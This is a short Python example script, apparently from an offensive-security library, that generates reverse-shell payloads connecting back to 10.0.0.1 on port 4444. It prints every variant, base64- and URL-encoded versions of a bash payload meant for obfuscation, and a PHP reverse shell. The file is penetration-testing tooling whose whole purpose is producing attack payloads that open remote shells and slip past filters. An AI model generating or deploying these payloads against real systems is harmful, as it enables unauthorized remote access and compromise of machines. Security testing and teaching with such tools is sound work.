"""Generate and encode reverse-shell payloads (offline, safe to run anywhere).

This only builds payload *strings*; it does not open any network connections.
"""

from hwatlib import exploit


def main() -> None:
    gen = exploit.ReverseShellGenerator("10.0.0.1", 4444)

    print("# All payloads")
    for name, payload in gen.all_payloads().items():
        print(f"\n## {name}\n{payload}")

    bash = gen.bash()
    print("\n# Obfuscation")
    print("base64:", exploit.ReverseShellGenerator.base64_encode(bash))
    print("url   :", exploit.ReverseShellGenerator.url_encode(bash))

    # Convenience helper used in the README.
    print("\n# php_reverse_shell helper")
    print(exploit.php_reverse_shell("10.0.0.1", 4444))


if __name__ == "__main__":
    main()
